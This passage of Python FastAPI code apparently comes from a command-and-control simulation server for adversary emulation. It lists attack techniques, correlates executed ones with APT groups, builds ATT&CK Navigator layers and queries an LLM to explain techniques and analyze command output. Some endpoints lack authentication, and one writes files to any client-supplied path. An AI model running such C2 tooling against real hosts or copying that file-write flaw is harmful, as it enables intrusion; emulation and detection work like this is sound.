async def openclaw_list_techniques(current_user: dict = Depends(get_current_user)):
    techniques = []
    for code, command in ATTACK_COMMANDS.items():
        mitre_info = mitre.get_technique(code.split('.')[0])
        techniques.append({"technique": code, "name": mitre_info.get("name", "Unknown") if mitre_info else "Unknown", "command": command, "has_mitre_info": mitre_info is not None})
    return {"total": len(techniques), "techniques": techniques}

@app.get("/api/openclaw/debug")
async def openclaw_debug():
    with EXECUTED_LOCK:
        executed = list(EXECUTED_TECHNIQUES.keys())
    return {"victim_name": VICTIM_NAME, "active_goal": GOALS.get(VICTIM_NAME), "executed_techniques": executed, "executed_count": len(executed), "pending_tasks": len(TASK_QUEUE.get(VICTIM_NAME, [])), "ai_available": ai.is_available()}

# ── APT CORRELATION ───────────────────────────────────────────
@app.get("/api/apt/correlate")
async def correlate_apt_groups(top_n: int = 20):
    if not apt_correlator.loaded:
        if mitre.techniques:
            apt_correlator.load_from_stix(mitre.techniques)
        else:
            raise HTTPException(status_code=503, detail="MITRE data not loaded")
    with EXECUTED_LOCK:
        executed_ids = list(EXECUTED_TECHNIQUES.keys())
    if not executed_ids:
        return {"executed_count": 0, "executed_techniques": [], "group_count": len(apt_correlator.groups), "top_matches": [], "message": "No techniques executed yet."}
    matches = apt_correlator.correlate(executed_ids)[:top_n]
    ranked  = [{"rank": i + 1, **m} for i, m in enumerate(matches)]
    return {"executed_count": len(executed_ids), "executed_techniques": sorted(executed_ids), "group_count": len(apt_correlator.groups), "top_matches": ranked}

@app.get("/api/apt/groups")
async def list_apt_groups(search: str = None):
    if not apt_correlator.loaded:
        if mitre.techniques:
            apt_correlator.load_from_stix(mitre.techniques)
    with apt_correlator._lock:
        groups = list(apt_correlator.groups.values())
    if search:
        s = search.lower()
        groups = [g for g in groups if s in g["name"].lower() or any(s in a.lower() for a in g.get("aliases", []))]
    return {"count": len(groups), "groups": [{"name": g["name"], "group_id": g["group_id"], "aliases": g["aliases"], "technique_count": len(g["techniques"]), "description": (g.get("description") or "")[:200]} for g in sorted(groups, key=lambda x: x["name"])]}

@app.get("/api/apt/{group_id}/techniques")
async def get_group_techniques(group_id: str):
    if not apt_correlator.loaded:
        if mitre.techniques:
            apt_correlator.load_from_stix(mitre.techniques)
    with apt_correlator._lock:
        group = None
        for g in apt_correlator.groups.values():
            if g["name"].lower() == group_id.lower() or g["group_id"].lower() == group_id.lower():
                group = g
                break
    if not group:
        raise HTTPException(status_code=404, detail=f"APT group '{group_id}' not found")
    with EXECUTED_LOCK:
        executed = set(EXECUTED_TECHNIQUES.keys())
    executed |= {t.split(".")[0] for t in executed}
    techniques_detail = []
    for tid in sorted(group["techniques"]):
        mitre_info = mitre.get_technique(tid.split(".")[0])
        name = mitre_info.get("name", "Unknown") if mitre_info else "Unknown"
        techniques_detail.append({"technique_id": tid, "name": name, "executed": tid in executed})
    executed_overlap = [t for t in techniques_detail if t["executed"]]
    return {"name": group["name"], "group_id": group["group_id"], "aliases": group["aliases"], "total_techniques": len(techniques_detail), "executed_overlap": len(executed_overlap), "coverage_pct": round(len(executed_overlap) / len(techniques_detail) * 100, 1) if techniques_detail else 0, "techniques": techniques_detail}

# ── NAVIGATOR ─────────────────────────────────────────────────
@app.get("/api/navigator/layer")
async def get_navigator_layer(name: str = "C2 Simulation — Executed Techniques", description: str = "Auto-generated from live C2 session"):
    with EXECUTED_LOCK:
        return build_navigator_layer(EXECUTED_TECHNIQUES, name, description)

@app.post("/api/navigator/layer/save")
async def save_navigator_layer(data: dict, current_user: dict = Depends(get_current_user)):
    output_path = data.get("output_path", "/tmp/c2_navigator_layer.json")
    name        = data.get("name", "C2 Simulation")
    description = data.get("description", f"Saved at {datetime.utcnow().isoformat()}Z")
    with EXECUTED_LOCK:
        layer = build_navigator_layer(EXECUTED_TECHNIQUES, name, description)
    try:
        parent = os.path.dirname(output_path)
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(output_path, "w") as f:
            json.dump(layer, f, indent=2)
        return {"status": "saved", "path": output_path, "technique_count": len(layer["techniques"])}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/navigator/status")
async def navigator_status():
    with EXECUTED_LOCK:
        count  = len(EXECUTED_TECHNIQUES)
        t_list = sorted(EXECUTED_TECHNIQUES.keys())
    return {"executed_technique_count": count, "executed_techniques": t_list, "apt_groups_loaded": apt_correlator.loaded, "apt_group_count": len(apt_correlator.groups) if apt_correlator.loaded else 0, "layer_ready": count > 0}

# ── AI ENDPOINTS ──────────────────────────────────────────────
@app.get("/api/ai/status")
async def ai_status():
    healthy = ai.is_available()
    return {"configured": healthy, "model": ai.model, "backend": "groq", "status": f"Groq connected — model '{ai.model}' ready" if healthy else "Groq API key not found"}

@app.post("/api/ai/explain")
async def explain_attack(data: dict):
    technique_id = data.get("technique", "").upper()
    if not technique_id:
        raise HTTPException(status_code=400, detail="'technique' field required")
    if mitre.techniques is None:
        mitre.load_data()
    mitre_raw  = mitre.get_technique(technique_id.split('.')[0])
    mitre_data = mitre.format_technique_response(mitre_raw, technique_id) if mitre_raw else {}
    prompt = PROMPT_TEMPLATES["explain_technique"].format(
        technique_id=technique_id,
        technique_name=mitre_data.get("technique_name") or mitre_data.get("name", "Unknown"),
        tactics=", ".join(mitre_data.get("tactics", [])) or "Unknown",
        platforms=", ".join(mitre_data.get("platforms", [])) or "Unknown",
        description=mitre_data.get("description", "No description available")
    )
    explanation = await ai.generate(prompt, temperature=0.4, max_tokens=256)
    return {"technique": technique_id, "technique_name": mitre_data.get("technique_name") or mitre_data.get("name"), "model": ai.model, "explanation": explanation, "mitre_context": mitre_data}

@app.post("/api/ai/explain/stream")
async def explain_attack_stream(data: dict):
    technique_id = data.get("technique", "").upper()
    if not technique_id:
        raise HTTPException(status_code=400, detail="'technique' field required")
    if mitre.techniques is None:
        mitre.load_data()
    mitre_raw  = mitre.get_technique(technique_id.split('.')[0])
    mitre_data = mitre.format_technique_response(mitre_raw, technique_id) if mitre_raw else {}
    prompt = PROMPT_TEMPLATES["explain_technique"].format(
        technique_id=technique_id,
        technique_name=mitre_data.get("technique_name") or mitre_data.get("name", "Unknown"),
        tactics=", ".join(mitre_data.get("tactics", [])) or "Unknown",
        platforms=", ".join(mitre_data.get("platforms", [])) or "Unknown",
        description=mitre_data.get("description", "No description available")
    )
    return StreamingResponse(ai.generate_stream(prompt, temperature=0.4, max_tokens=300), media_type="text/event-stream", headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})

@app.post("/api/ai/analyze-output")
async def analyze_output(data: dict):
    technique_id = data.get("technique", "").upper()
    command      = data.get("command", "N/A")
    output       = data.get("output", "")
    if not output:
        raise HTTPException(status_code=400, detail="'output' field required")
    if mitre.techniques is None:
        mitre.load_data()
    mitre_raw  = mitre.get_technique(technique_id.split('.')[0]) if technique_id else None
    mitre_data = mitre.format_technique_response(mitre_raw, technique_id) if mitre_raw else {}
    prompt = PROMPT_TEMPLATES["analyze_output"].format(
        technique_id=technique_id or "Unknown",
        technique_name=mitre_data.get("technique_name") or mitre_data.get("name", "Unknown"),
        command=command, output=output[:3000]
    )
    analysis = await ai.generate(prompt, temperature=0.3, max_tokens=200)
    return {"technique": technique_id, "model": ai.model, "analysis": analysis}

@app.post("/api/ai/threat-hunt")
async def threat_hunt(data: dict):
    techniques = data.get("techniques", [])
    timeframe  = data.get("timeframe", "unknown timeframe")
    if not techniques:
        raise HTTPException(status_code=400, detail="'techniques' list required")
    if mitre.techniques is None:
        mitre.load_data()
    enriched = []
    for t in techniques:
        raw  = mitre.get_technique(t.split('.')[0])
        name = raw.get("name") if raw else "Unknown"
        enriched.append(f"- {t}: {name}")
    prompt = PROMPT_TEMPLATES["threat_hunt"].format(techniques_list="\n".join(enriched), timeframe=timeframe)
    hypothesis = await ai.generate(prompt, temperature=0.5, max_tokens=250)
    return {"techniques": techniques, "timeframe": timeframe, "model": ai.model, "hypothesis": hypothesis}

@app.post("/api/ai/chat")
async def ai_chat(data: dict):
    messages = data.get("messages", [])
    if not messages:
        raise HTTPException(status_code=400, detail="'messages' list required")
    system_msgs = [m for m in messages if m.get("role") == "system"]
    conv_msgs   = [m for m in messages if m.get("role") != "system"][-4:]
    if not system_msgs:
        system_msgs = [{"role": "system", "content": "You are an expert cybersecurity analyst. Be concise — 3-6 sentences max."}]
    response = await ai.chat(system_msgs + conv_msgs, temperature=0.6, max_tokens=200)
    return {"model": ai.model, "response": response}

@app.get("/api/ai/test")
async def ai_test():
    healthy = await ai.health_check()
    return {"status": "Groq Connected" if healthy else "Not configured", "configured": healthy, "model": ai.model}

# ── HEALTH ────────────────────────────────────────────────────
@app.get("/health")
async def health_check():
    if mitre.techniques is None:
        mitre.load_data()
    with EXECUTED_LOCK:
        exec_count = len(EXECUTED_TECHNIQUES)
    return {
        "status":                "healthy",
        "timestamp":             datetime.utcnow().isoformat(),
        "mitre_loaded":          mitre.techniques is not None,
        "mitre_source":          "github" if not mitre.using_local_cache else "local_cache",
        "technique_count":       len(mitre.techniques_dict) if not mitre.using_local_cache else len(MITRE_LOCAL_CACHE),
        "agents_connected":      len(AGENTS),
        "tasks_pending":         sum(len(t) for t in TASK_QUEUE.values()),
        "ai_configured":         ai.is_available(),
        "ai_model":              ai.model,
        "apt_correlator_loaded": apt_correlator.loaded,
        "apt_groups_loaded":     len(apt_correlator.groups) if apt_correlator.loaded else 0,
        "executed_techniques":   exec_count,
        "navigator_layer_ready": exec_count > 0,
        "openclaw_techniques":   len(ATTACK_COMMANDS),
    }

# ── ROOT ──────────────────────────────────────────────────────
@app.get("/")
async def root():
    return {"name": "C2 Simulation API", "version": "3.1.0", "status": "operational", "dashboard": "/dashboard", "docs": "/docs"}

# ── STARTUP ───────────────────────────────────────────────────
@app.on_event("startup")
async def startup_event():
    logger.info("=" * 60)
    logger.info(" C2 Simulation API v3.1 — Groq + OpenClaw + APT")
    logger.info("=" * 60)
    mitre.load_data()
    if not mitre.using_local_cache:
        logger.info(f"MITRE: GitHub STIX — {len(mitre.techniques_dict)} techniques")
    else:
        logger.info(f"MITRE: local cache — {len(MITRE_LOCAL_CACHE)} techniques")
    if mitre.techniques:
        n = apt_correlator.load_from_stix(mitre.techniques)
        logger.info(f"APT correlator: {n} groups loaded")
    healthy = await ai.health_check()
    if healthy:
        logger.info(f"AI: Groq API connected — model '{ai.model}' ready")
    else:
        logger.warning("AI: Groq API key not configured")
    logger.info(f"OpenClaw: {len(ATTACK_COMMANDS)} attack techniques supported")
    asyncio.create_task(log_system_metrics())
    asyncio.create_task(log_security_events())
    asyncio.create_task(log_network_events())
    asyncio.create_task(log_filesystem_events())
    asyncio.create_task(auto_save_navigator_layer(interval_seconds=30))
    logger.info("All background tasks started")
    logger.info("=" * 60)
